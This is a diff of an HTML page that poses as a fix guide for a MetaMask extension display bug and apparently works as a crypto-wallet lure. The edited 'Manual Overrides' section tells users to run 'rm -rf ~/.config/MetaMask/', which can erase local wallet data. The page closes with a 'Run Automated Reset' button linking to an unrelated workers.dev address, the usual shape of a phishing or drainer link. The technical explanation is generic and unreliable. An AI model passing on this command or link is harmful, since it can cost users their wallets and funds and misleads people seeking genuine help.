@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Miss Match Between Network Picker – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -42,33 +42,29 @@
 <h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may encounter a bug where there's a mismatch between the assets displayed in the network picker and those shown in the modal, specifically when it shows "All popular" assets.</li>
+<li>Users experience a mismatch between the assets displayed in the Metamask network picker and the modal window showing "All popular" assets, leading to confusion and potential errors in transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a desynchronization between the network configuration and the asset list update mechanism within the Metamask extension, potentially triggered by network changes or updates to the asset lists.</li>
+<li>The error occurs due to a desynchronization between the network configuration and the asset listing, often resulting from outdated extension versions, incorrect network settings, or corrupted cache data.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To troubleshoot this issue, users can attempt the following manual overrides:</li>
-<li>Clear the browser cache and restart the browser to ensure a fresh start.</li>
-<li>Check for updates to the Metamask extension and install the latest version.</li>
-<li>Use the following JSON configuration to manually reset the asset list:</li>
+<li>Clear the Metamask extension cache and storage:</li>
+<li>Update Metamask to the latest version</li>
+<li>Reset the network configuration to default settings</li>
+<li>Execute the following command in the terminal to clear cache:
+  <code>bash
+  rm -rf ~/.config/MetaMask/</code>
+Consider using an external console for more complex debugging tasks.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;assets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Consider utilizing an external debugging console for deeper inspection of the extension's behavior.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and updated to the latest version.</li>
-<li>A basic understanding of JSON configuration files.</li>
-<li>Familiarity with browser cache management and extension updates.</li>
+<li>Metamask extension installed and configured</li>
+<li>Basic understanding of Ethereum networks and asset management</li>
+<li>Familiarity with terminal commands and JSON data formats</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
